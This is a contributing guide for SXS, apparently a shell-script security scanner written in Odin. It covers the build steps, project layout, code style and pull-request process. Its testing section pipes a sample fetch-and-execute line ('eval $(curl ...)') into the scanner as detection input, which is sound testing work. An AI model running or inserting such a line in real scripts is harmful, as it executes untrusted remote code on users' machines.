# Contributing to SXS

Thank you for your interest in contributing to SXS!

## Development Setup

### Prerequisites

- [Odin](https://odin-lang.org/) compiler (latest version)
- Git

### Clone and Build

```bash
# Clone the repository
git clone https://github.com/zephyr-systems/sxs.git
cd sxs

# Build the project
make build

# Or with debug symbols
make dev
```

### Project Structure

```
sxs/
├── main.odin          # CLI parsing
├── config.odin        # entry point and argument Configuration loading (3-tier system)
├── formatter.odin    # Output formatters (JSON, Text, SARIF)
├── Makefile          # Build automation
├── docs_internal/    # Internal documentation
├── README.md         # User documentation
├── CONTRIBUTING.md   # This file
└── LICENSE           # MIT license
```

## Code Style

SXS follows standard Odin conventions:

- **Package name**: lowercase, matching directory name
- **Procedures**: `camelCase`
- **Types**: `PascalCase`
- **Constants**: `SCREAMING_SNAKE_CASE` or `PascalCase` for named constants
- **Imports**: grouped - standard library first, then external

### Example

```odin
package sxs

import "core:fmt"
import "core:os"

import "../shellx"

My_Type :: struct {
    field: int,
}

do_something :: proc() {
    fmt.println("Hello")
}
```

## Testing

Currently, SXS uses manual testing. To test:

```bash
# Build
make build

# Test with a script
echo 'eval $(curl http://example.com)' | ./sxs --stdin

# Test various flags
./sxs -v -f text script.sh
./sxs -f sarif script.sh > results.sarif
```

## Submitting Changes

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/my-feature`
3. **Make** your changes
4. **Test** the build: `make build`
5. **Commit** with clear messages: `git commit -am 'Add feature'`
6. **Push** to your fork: `git push origin feature/my-feature`
7. **Submit** a Pull Request

## Reporting Issues

When reporting issues, please include:

- SXS version (run `sxs --version`)
- Command used
- Input file or script that triggered the issue
- Expected vs actual behavior
- Full error output

## Feature Requests

We welcome feature requests! Please include:

- Use case description
- Proposed solution
- Alternative approaches considered
- Any implementation ideas

## Code of Conduct

- Be respectful and inclusive
- Provide constructive feedback
- Help others learn and improve

## Questions?

Feel free to open an issue for questions about contributing or development.
